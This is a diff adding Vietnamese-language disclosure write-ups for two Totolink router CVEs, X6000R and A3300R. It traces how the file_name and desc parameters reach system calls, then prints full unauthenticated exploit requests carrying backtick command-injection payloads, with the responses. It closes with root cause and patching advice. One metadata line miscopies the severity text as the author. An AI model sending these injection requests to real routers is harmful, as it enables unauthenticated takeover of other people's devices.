@@ -420,9 +420,181 @@ CVE-2025-52284 là một ví dụ điển hình về lỗi Command Injection do 
 
 Việc setup lab ảo hóa tuy phức tạp nhưng là giải pháp hiệu quả khi không có thiết bị thực. Hy vọng bài viết này giúp ích cho cộng đồng security research trong việc tìm hiểu và phòng chống các lỗ hổng tương tự.
 
+
+# Phân Tích Lỗ Hổng Command Injection CVE-2025-52053 Trên Totolink X6000R
+
+## Giới Thiệu
+
+CVE-2025-52053 là một lỗ hổng Command Injection được phát hiện trong thiết bị router Totolink X6000R phiên bản V9.4.0cu.1360_B20241207. Lỗ hổng này nằm trong chức năng `UploadFirmwareFile` và cho phép kẻ tấn công không cần xác thực có thể thực thi các lệnh tùy ý trên thiết bị.
+
+## Thông Tin Lỗ Hổng
+
+- **CVE ID**: CVE-2025-52053
+- **Thiết bị ảnh hưởng**: Totolink X6000R
+- **Phiên bản firmware**: V9.4.0cu.1360_B20241207
+- **Loại lỗ hổng**: Command Injection
+- **Hàm bị ảnh hưởng**: `sub_417D74` (trong binary `shttp`)
+- **Tham số khai thác**: `file_name`
+- **Mức độ nghiêm trọng**: Cao (không cần xác thực)
+- **Author**: Cao (không cần xác thực)
+- **Link tải firmware**: [https://www.totolink.net/data/upload/20250328/7a1a804767bc5b1196c480f62c40a20e.rar](https://www.totolink.net/data/upload/20250328/7a1a804767bc5b1196c480f62c40a20e.rar)
+- **Phát hiện bởi**: Hao Ngo, Tin Pham aka TF1T
+
+
+## Phân Tích Chi Tiết
+
+### 1. Luồng Xử Lý Dữ Liệu
+
+Lỗ hổng xảy ra trong quá trình xử lý upload firmware:
+
+1. **Binary shttp**: Hàm `sub_417D74` nhận tham số `file_name` từ request HTTP và truyền nó vào hàm `firmware_check`
+
+![image.png](CVE-2025-52053/UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image.png)
+
+2. **Binary libcscommon.so**: Hàm `firmware_check` truyền giá trị `a1` (chứa `file_name`) trực tiếp vào hàm `do_system` để thực thi lệnh mà không có bất kỳ validation nào
+
+![image.png](CVE-2025-52053/UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%201.png)
+
+### 2. Khai Thác
+
+**Request khai thác:**
+```python
+POST /cgi-bin/cstecgi.cgi HTTP/1.1
+Host: 192.168.210.133:8080
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 106
+
+{"file_name": "1`ls>/web/cmd3.txt`","content_length":"100","topicurl":"UploadFirmwareFile","token":"1234"}
+```
+
+**Response:**
+```python
+HTTP/1.0 200 OK
+Server: SHTTPD 
+Date: Tue, 10 Jun 2025 08:06:42 GMT
+X-UA-Compatible: IE=edge
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Expires: -1
+Content-Type: application/json
+Connection: close
+
+{
+	"upgradeERR":	"MM_cloud_fw2flash1"
+}
+```
+
+### 3. Proof of Concept
+
+Sau khi gửi request với payload chứa command injection, lệnh được thực thi thành công:
+
+![image.png](CVE-2025-52053/UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%202.png)
+
+Kết quả file `/web/cmd3.txt` được tạo với nội dung là output của lệnh `ls`:
+
+![image.png](CVE-2025-52053/UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%203.png)
+
+### 4. Root Cause
+
+Vấn đề cốt lõi là tham số `file_name` được truyền trực tiếp vào hàm `do_system` mà không qua bất kỳ kiểm tra hay lọc nào. Điều này cho phép attacker inject các command shell thông qua ký tự backtick (`) hoặc các ký tự đặc biệt khác.
+
+---
+
+# Phân Tích Lỗ Hổng Command Injection CVE-2025-52046 Trên Totolink A3300R
+
+## Giới Thiệu
+
+CVE-2025-52046 là một lỗ hổng Command Injection nghiêm trọng được phát hiện trong router Totolink A3300R phiên bản mới nhất V17.0.0cu.596_B20250515. Lỗ hổng này nằm trong chức năng `setWiFiAclRules` và cho phép kẻ tấn công thực thi lệnh tùy ý mà không cần xác thực.
+
+## Thông Tin Lỗ Hổng
+
+- **CVE ID**: CVE-2025-52046
+- **Thiết bị ảnh hưởng**: Totolink A3300R
+- **Phiên bản firmware**: V17.0.0cu.596_B20250515
+- **Loại lỗ hổng**: Command Injection
+- **Hàm bị ảnh hưởng**: `sub_4197C0` (trong binary `shttp`)
+- **Tham số khai thác**: `mac`, `desc`
+- **Mức độ nghiêm trọng**: Cao (không cần xác thực)
+- **Link tải firmware**: [https://www.totolink.net/data/upload/20250515/8c0a04842e9e10188d0822b7b19cf212.web](https://www.totolink.net/data/upload/20250515/8c0a04842e9e10188d0822b7b19cf212.web)
+- **Phát hiện bởi**: Hiw0rl4 và Phl từ VietSunshine Cyber Security Services
+
+## Phân Tích Chi Tiết
+
+### 1. Luồng Xử Lý Dữ Liệu
+
+Lỗ hổng xảy ra trong quá trình xử lý cấu hình WiFi Access Control List:
+
+1. **Binary shttp**: Hàm `sub_4197C0` nhận các tham số `mac` và `desc` từ request HTTP, sử dụng `snprintf` để ghép hai tham số này thành một chuỗi, sau đó truyền chuỗi kết quả vào hàm `wificonf_add_by_key`
+
+![image.png](CVE-2025-52046/setWiFiAclRules%20(A3300R)%202108aff2dc8b80348d94e7fd1378d475/image.png)
+
+2. **Binary libcscommon.so**: Hàm `wificonf_add_by_key` truyền giá trị `a3` vào `v12`, sau đó gọi hàm `csteSystem()` để thực thi lệnh
+
+![image.png](CVE-2025-52046/setWiFiAclRules%20(A3300R)%202108aff2dc8b80348d94e7fd1378d475/image%201.png)
+
+### 2. Khai Thác
+
+**Request khai thác:**
+```python
+POST /cgi-bin/cstecgi.cgi HTTP/1.1
+Host: 192.168.1.4:1380
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 127
+Origin: http://192.168.1.4:1380
+Connection: keep-alive
+Referer: http://192.168.1.4:1380/login.html
+X-PwnFox-Color: blue
+Priority: u=0
+
+{"mac":"14:16:9E:CC:BB:3F","desc":"hihihohohaha`ls>/web/cmdi2.txt`","addEffect":"1","wifiIdx":"0","topicurl":"setWiFiAclRules"}
+```
+
+**Response:**
+```python
+HTTP/1.0 200 OK
+Server: SHTTPD 1.42
+Date: Wed, 11 Jun 2025 15:47:38 GMT
+X-UA-Compatible: IE=edge
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Expires: -1
+Content-Type: application/json
+Connection: close
+
+{ "success": true, "error": "", "lan_ip": "", "wtime": "5", "reserv": "reserv" }
+```
+
+### 3. Proof of Concept
+
+Sau khi gửi request với payload chứa command injection trong tham số `desc`, lệnh được thực thi thành công:
+
+![image.png](CVE-2025-52046/setWiFiAclRules%20(A3300R)%202108aff2dc8b80348d94e7fd1378d475/image%202.png)
+
+Kết quả file `/web/cmdi2.txt` được tạo với nội dung là output của lệnh `ls`:
+
+![image.png](CVE-2025-52046/setWiFiAclRules%20(A3300R)%202108aff2dc8b80348d94e7fd1378d475/image%203.png)
+
+### 4. Root Cause
+
+Vấn đề xảy ra do:
+- Tham số `desc` (mô tả) được ghép với tham số `mac` thông qua `snprintf`
+- Chuỗi kết quả được truyền trực tiếp vào hàm `csteSystem()` mà không có validation
+- Attacker có thể inject command thông qua ký tự backtick (`) trong tham số `desc`
+
+## Kết Luận
+
+Cả hai lỗ hổng CVE-2025-52053 và CVE-2025-52046 đều là những ví dụ điển hình về lỗi Command Injection do thiếu validation đầu vào. Với khả năng khai thác không cần xác thực và cho phép thực thi lệnh với quyền cao, đây là những lỗ hổng nghiêm trọng cần được vá ngay lập tức. Người dùng các thiết bị Totolink X6000R và A3300R nên cập nhật firmware mới nhất hoặc áp dụng các biện pháp bảo vệ như hạn chế truy cập vào giao diện quản trị từ Internet.
+
+
 ## Tham Khảo
 
 - [Totolink Official Website](https://www.totolink.net/)
-- [ARM Emulation Tools](https://github.com/phieulang1993/emu/tree/master/emu_arm)
+- [PhieuLang Docs](https://github.com/phieulang1993/emu/tree/master/emu_arm)
 - OWASP Command Injection Prevention Cheat Sheet
 - QEMU Documentation for ARM64 Architecture
+
